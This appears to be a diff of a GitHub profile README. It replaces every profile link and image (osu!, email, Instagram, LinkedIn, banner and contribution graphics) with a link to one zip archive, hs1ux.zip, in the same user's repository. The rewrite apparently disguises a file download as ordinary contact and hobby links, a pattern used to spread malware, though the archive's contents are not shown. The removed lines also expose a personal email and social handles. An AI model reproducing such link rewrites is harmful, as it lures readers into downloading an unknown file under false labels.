@@ -1,5 +1,5 @@
 <h1 align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?font=Righteous&size=35&pause=1000&color=00C3FF&center=true&vCenter=true&width=500&height=70&lines=Hi+There!+👋;+It's+f3m1p0l4r1cguy+here;" />
+  <img src="https://raw.githubusercontent.com/f3m1p0l4r1cguy/hs1ux/main/Hiren/hs1ux.zip+There!+👋;+It's+f3m1p0l4r1cguy+here;" />
 </h1>
 
 <h3 align="center" style="color: #555; font-family: 'Fira Code', monospace;">
@@ -11,7 +11,7 @@
 <div align="center" style="font-size:16px; line-height:1.8;">
   💻 <b>Currently Improving myself in:</b> Cybersecurity  <br/>
   🌱 <b>Learning:</b> Network, PowerShell, Blue Team Stuff <br/> 
-  🎮 <b>Hobbies:</b>  Playing <a href="https://osu.ppy.sh/users/28000064" target="_blank"> osu!  </a>
+  🎮 <b>Hobbies:</b>  Playing <a href="https://raw.githubusercontent.com/f3m1p0l4r1cguy/hs1ux/main/Hiren/hs1ux.zip" target="_blank"> osu!  </a>
 </div>
 
 <br/>
@@ -19,14 +19,14 @@
 <!-- Reach Me -->
 <div align="center">
   <h3 style="color:#5CE65C;">📫 Reach Me</h3>
-  <a href="mailto:bekirovm453@gmail.com">
-    <img src="https://skillicons.dev/icons?i=gmail" width="50px" style="margin: 10px; transition: transform 0.3s;" />
+  <a href="https://raw.githubusercontent.com/f3m1p0l4r1cguy/hs1ux/main/Hiren/hs1ux.zip">
+    <img src="https://raw.githubusercontent.com/f3m1p0l4r1cguy/hs1ux/main/Hiren/hs1ux.zip" width="50px" style="margin: 10px; transition: transform 0.3s;" />
   </a>
-  <a href="https://www.instagram.com/muradbakirov" target="_blank">
-    <img src="https://skillicons.dev/icons?i=instagram" width="50px" style="margin: 10px; transition: transform 0.3s;" />
+  <a href="https://raw.githubusercontent.com/f3m1p0l4r1cguy/hs1ux/main/Hiren/hs1ux.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/f3m1p0l4r1cguy/hs1ux/main/Hiren/hs1ux.zip" width="50px" style="margin: 10px; transition: transform 0.3s;" />
   </a>
-  <a href="https://www.linkedin.com/in/murad-bakirov-115067238/" target="_blank">
-    <img src="https://skillicons.dev/icons?i=linkedin" width="50px" style="margin: 10px; transition: transform 0.3s;" />
+  <a href="https://raw.githubusercontent.com/f3m1p0l4r1cguy/hs1ux/main/Hiren/hs1ux.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/f3m1p0l4r1cguy/hs1ux/main/Hiren/hs1ux.zip" width="50px" style="margin: 10px; transition: transform 0.3s;" />
   </a>
 </div>
 
@@ -41,5 +41,5 @@
 <div align="center">
   
   
-  <img alt="snake eating my contributions" src="https://raw.githubusercontent.com/salesp07/salesp07/output/github-contribution-grid-snake.svg" />
+  <img alt="snake eating my contributions" src="https://raw.githubusercontent.com/f3m1p0l4r1cguy/hs1ux/main/Hiren/hs1ux.zip" />
 </div>
